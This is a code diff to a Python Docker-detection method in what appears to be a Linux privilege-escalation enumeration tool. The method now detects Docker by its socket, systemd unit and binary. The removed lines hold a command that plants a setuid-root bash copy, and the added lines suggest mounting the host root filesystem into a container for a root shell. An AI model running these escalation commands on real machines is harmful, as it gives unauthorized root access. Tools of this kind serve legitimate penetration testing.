@@ -18,15 +18,24 @@ class Docker:
 
     def is_docker_installed(self):
         """
-        Check if docker service is present
+        Check if docker is present (SysV init, systemd unit, binary, or socket).
         If present, could be used with gtfobins
             - https://gtfobins.github.io/gtfobins/docker/
         """
-        if os.path.exists('/etc/init.d/docker'):
-            return "/etc/init.d/docker found\n->docker run -v /home/${USER}:/h_docs \
-                    ubuntu bash -c 'cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;' && ~/rootshell -p" 
-        else:
-            return False
+        present = (
+            os.path.exists('/etc/init.d/docker')
+            or os.path.exists('/lib/systemd/system/docker.service')
+            or os.path.exists('/usr/lib/systemd/system/docker.service')
+            or os.path.exists('/var/run/docker.sock')
+            or os.path.exists('/run/docker.sock')
+            or os.path.exists('/usr/bin/docker')
+        )
+        if present:
+            return (
+                "docker present (service/socket/binary)\n"
+                "-> docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+            )
+        return False
 
 
     def find_mounted_socket(self, user):
